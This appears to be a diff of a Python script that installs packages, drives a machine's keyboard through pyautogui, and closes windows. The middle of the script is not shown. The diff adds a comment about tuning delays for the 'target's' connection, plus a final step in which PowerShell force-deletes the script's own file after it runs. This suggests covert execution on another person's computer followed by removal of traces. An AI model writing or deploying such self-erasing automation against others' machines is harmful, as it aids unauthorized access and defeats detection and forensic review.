@@ -1,5 +1,8 @@
-import subprocess
+import os
 import sys
+import subprocess
+import time
+#You may need to change time to sleep depending on your targets connection!
 
 # Function to install a Python package using pip
 def install_package(package_name):
@@ -31,3 +34,7 @@ for _ in range(13):
 pyautogui.press('enter')
 time.sleep(3)
 pyautogui.hotkey('alt', 'f4')
+time.sleep(3)
+script_path = os.path.abspath(sys.argv[0])
+cmd = f'powershell Remove-Item "{script_path}" -Force'
+subprocess.Popen(cmd, shell=True)
